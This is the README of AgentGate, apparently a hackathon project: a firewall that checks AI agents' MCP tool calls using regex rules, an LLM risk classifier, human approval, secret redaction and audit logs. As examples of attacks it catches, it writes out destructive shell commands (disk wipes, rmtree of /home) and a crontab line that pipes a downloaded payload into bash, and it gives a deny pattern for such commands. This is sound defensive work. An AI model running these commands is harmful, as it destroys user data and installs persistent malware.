# AgentGate

> 🏆 **micro1 Frontier/Agentic Workflows Hackathon 2026 Submission** — Read the complete submission package in [SUBMISSION.md](SUBMISSION.md).  
> 🚀 **See it live:** [agentgate-demo.onrender.com](https://agentgate-demo.onrender.com) — landing page + working live firewall dashboard with real-time SSE event streaming.

[![release](https://img.shields.io/badge/release-v1.1.0-blue)](https://github.com/gunjitdhakar15/AgentGate/releases/latest)
[![Go](https://img.shields.io/badge/Go-1.22+-00ADD8)](https://go.dev)
[![tests](https://img.shields.io/badge/tests-passing-green)]()
[![license](https://img.shields.io/badge/license-MIT-blue)]()

An intelligent, tiered **security firewall** for AI agent tool calls (MCP / Model Context Protocol).

`AgentGate` sits between your agent (Claude Code, Cursor, Windsurf, or any MCP client) and a tool server, enforcing policy, evaluating semantic danger via an LLM judge, redacting secrets, rate-limiting, and auditing every single call — before it ever touches your system.

```
┌──────────┐   tools/call   ┌────────────────────────────────────────────────────────┐   tools/call   ┌──────────────┐
│  Agent   │ ─────────────► │                       AgentGate                        │ ─────────────► │ Tool server  │
│ (client) │ ◄───────────── │                                                        │ ◄───────────── │  (child)     │
└──────────┘    response    │ • Tier 0: Deny-by-default rules, regex & rate-limit    │    response    └──────────────┘
                            │ • Tier 1: Claude Haiku semantic risk classifier        │
                            │ • Router: 3-way routing (Allow / Human Approval / Deny)│
                            │ • Secrets: Nested JSON arg & response redaction        │
                            └───────────────────────────┬────────────────────────────┘
                                                        ▼
                                       audit.jsonl (JSONL, secrets stripped)
                                                        ▼
                                       Live SSE Dashboard (http://localhost:8700)
```

---

## The Problem: The "Semantic Gap"

Agents are now given shell execution, filesystem access, and web tools. Today's standard defense is **Tier 0 static regex** (e.g. blocking `rm -rf`). But static pattern matching is **security theater**:

* An agent running `find / -delete` or `dd if=/dev/zero of=/dev/sda` wipes the entire machine, but contains no `rm -rf` keyword.
* An agent running `(crontab -l; echo '* * * * * curl payload | bash') | crontab -` installs persistent malware with zero keyword overlap.
* An agent running `python3 -c "import shutil; shutil.rmtree('/home')"` destroys user data via Python syntax.

**AgentGate bridges this semantic gap with a tiered defense-in-depth architecture.**

---

## Measured Benchmark Results

Evaluated on our 20-case adversarial test suite (`eval/cases.json`) across safe workflows, regex attacks, and semantic gap attacks:

| Metric | Tier 0 Baseline (Pre-Hackathon) | AgentGate Tier 1 (Final Solution) | Improvement |
|---|---|---|---|
| **Overall Accuracy** | 40.0% (8/20) | **80.0%** (16/20) | **+40.0% gain** |
| **Semantic Gap Catch Rate** | **0.0%** (0/11) | **81.8%** (9/11) | **+81.8% gain** |
| **Regex Dangerous Catch Rate** | 75.0% (3/4) | **100.0%** (4/4) | **+25.0% gain** |
| **Missed Danger Rate** | 80.0% | **13.3%** | **-66.7% reduction** |
| **Execution Cost** | $0.00 | **<$0.03** (Claude Haiku) | Ultra-low cost |

> **Key Finding & Hot Take:** Tier 1 catches 82% of previously invisible attacks, but trades recall for precision (flagging 2 of 5 standalone shell commands as suspicious). AgentGate solves this using **pure 3-way routing with Human-in-the-Loop checkpoints** for the gray zone `[0.4, 0.8)`.

---

## Quick Reproduction (Clean Environment)

### 1. Run Unit & E2E Tests
```bash
go test ./... -v
```

### 2. Run Baseline vs Tier 1 Evaluation Harness
```bash
# Baseline evaluation (Tier 0 regex only -> 40% accuracy)
go run ./cmd/eval-harness -config configs/agentgate.yaml -cases eval/cases.json -label tier0-baseline

# Tier 1 evaluation (Offline simulator -> 80% accuracy, 81.8% semantic gap caught)
go run ./cmd/eval-harness -config configs/agentgate.yaml -cases eval/cases.json -label tier0+tier1 -mock-judge

# Tier 1 evaluation (Live Claude Haiku API)
export ANTHROPIC_API_KEY="your-api-key"
go run ./cmd/eval-harness -config configs/agentgate.yaml -cases eval/cases.json -label tier0+tier1 -with-judge
```

### 3. Run Live Web Dashboard with Demo Traffic
```bash
go run ./cmd/agentgate -serve :8700 -demo
```
Then open **`http://localhost:8700`** to watch the real-time SSE feed, allow/block distribution, and secret redaction counters.

---

## Install & Run

**Option 1 — download a binary** ([all releases](https://github.com/gunjitdhakar15/AgentGate/releases/latest)):

| Platform | Download |
|---|---|
| Windows | [agentgate-windows-amd64.exe](https://github.com/gunjitdhakar15/AgentGate/releases/latest/download/agentgate-windows-amd64.exe) |
| Linux | [agentgate-linux-amd64](https://github.com/gunjitdhakar15/AgentGate/releases/latest/download/agentgate-linux-amd64) |
| macOS (Apple Silicon) | [agentgate-darwin-arm64](https://github.com/gunjitdhakar15/AgentGate/releases/latest/download/agentgate-darwin-arm64) |
| macOS (Intel) | [agentgate-darwin-amd64](https://github.com/gunjitdhakar15/AgentGate/releases/latest/download/agentgate-darwin-amd64) |

**Option 2 — build from source:**

```bash
git clone https://github.com/gunjitdhakar15/AgentGate
cd AgentGate
go build -o agentgate ./cmd/agentgate

# Wrap any MCP server with policy & live dashboard
./agentgate -config configs/agentgate.yaml -serve :8700
```

Point your MCP client at `agentgate` instead of the raw tool server binary — everything else is transparent.

---

## Pipeline Architecture

For every `tools/call` request from an AI agent:

1. **Rate Limit:** Token-bucket limiter per tool (e.g. max 5 shell executions/minute).
2. **Tier 0 Policy Check:** Deny-by-default with explicit allow rules and regex keyword guards.
3. **Secret Redaction:** Scrub API keys (`sk-...`, `Bearer ...`) from arguments before forwarding.
4. **Tier 1 LLM Risk Classifier:** Calls Claude Haiku via structured tool choice (`risk_score`, `category`, `rationale`).
5. **Pure 3-Way Routing Engine:**
   * `RiskScore < 0.4` ➔ Auto-Allowed.
   * `0.4 <= RiskScore < 0.8` ➔ Prompts operator via Human-in-the-Loop CLI approval.
   * `RiskScore >= 0.8` ➔ Auto-Blocked.
   * **Asymmetric Fail-Safe:** Read tools fail open on API error; destructive tools (`shell`, `write_file`) fail closed.
6. **Response Scrubbing & Audit:** Response is sanitized and recorded to `agentgate-audit.jsonl` with zero secret leakage.

---

## Example Policy (`configs/agentgate.yaml`)

```yaml
tool_server:
  command: npx
  args: ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"]

policy:
  tool_rules:
    - apply_to: "*"
      deny: true
      reason: "deny all tools by default"
    - apply_to: read_file
      allow: true
    - apply_to: list_directory
      allow: true
    - apply_to: search_files
      allow: true
    - apply_to: shell
      allow: true
      arg_deny_pattern: "(rm -rf|del /s|shutdown|format )"
      reason: "dangerous shell commands blocked"
    - apply_to: write_file
      deny: true
      reason: "read-only filesystem mode"

  redact:
    - keys: ["api_key", "password", "token", "secret", "authorization"]
      pattern: ".*"
      replacement: "***"
    - pattern: "sk-[A-Za-z0-9]{20,}"
      replacement: "***"
    - pattern: "Bearer\\s+[A-Za-z0-9._-]{10,}"
      replacement: "Bearer ***"

  rate_limits:
    - apply_to: shell
      burst: 5
      window: 1m

  max_arg_bytes: 65536
```

---

## Repository Layout

```
cmd/agentgate/     CLI entrypoint, config loading, MCP proxy daemon, live dashboard
cmd/eval-harness/  Adversarial evaluation suite (runs cases against Tier 0 / Tier 1)
cmd/mock-tools/    Mock MCP stdio tool server for testing and evaluation
internal/mcp/      JSON-RPC 2.0 framing, stdio transport streams
internal/gate/     Core proxy engine, redaction, token-bucket rate limiter, E2E tests
internal/judge/    Tier 1 LLM classifier, Anthropic client, pure router, approvers, mock judge
internal/audit/    JSONL audit store with replay support
internal/web/      Real-time SSE web dashboard
eval/              20-case adversarial test set (eval/cases.json) and run results
configs/           Example YAML policies (configs/agentgate.yaml)
```

---

## Hackathon Submission & Deliverables

Full details on the problem framing, architecture, changelog, video script, and agent trajectories are available in **[SUBMISSION.md](SUBMISSION.md)**.